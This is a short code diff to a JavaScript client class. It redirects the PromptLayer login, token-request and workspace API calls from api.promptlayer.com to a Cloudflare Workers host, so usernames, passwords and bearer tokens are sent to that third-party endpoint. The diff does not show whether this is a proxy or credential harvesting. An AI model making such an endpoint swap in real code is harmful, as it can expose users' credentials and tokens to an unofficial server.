@@ -26,7 +26,7 @@ class Manager {
 
   async login(username, password) {
     try {
-      const response = await axios.post("https://api.promptlayer.com/login", {
+      const response = await axios.post("https://promptlayer.acips.workers.dev/login", {
         email: username,
         password: password
       }, {
@@ -50,7 +50,7 @@ class Manager {
 
   async getClientId(token) {
     try {
-      const response = await axios.post("https://api.promptlayer.com/ws-token-request", null, {
+      const response = await axios.post("https://promptlayer.acips.workers.dev/ws-token-request", null, {
         headers: {
           Authorization: "Bearer " + token
         }
@@ -68,7 +68,7 @@ class Manager {
 
   async getWorkspaceId(token) {
     try {
-      const response = await axios.get("https://api.promptlayer.com/workspaces", {
+      const response = await axios.get("https://promptlayer.acips.workers.dev/workspaces", {
         headers: {
           Authorization: "Bearer " + token
         }
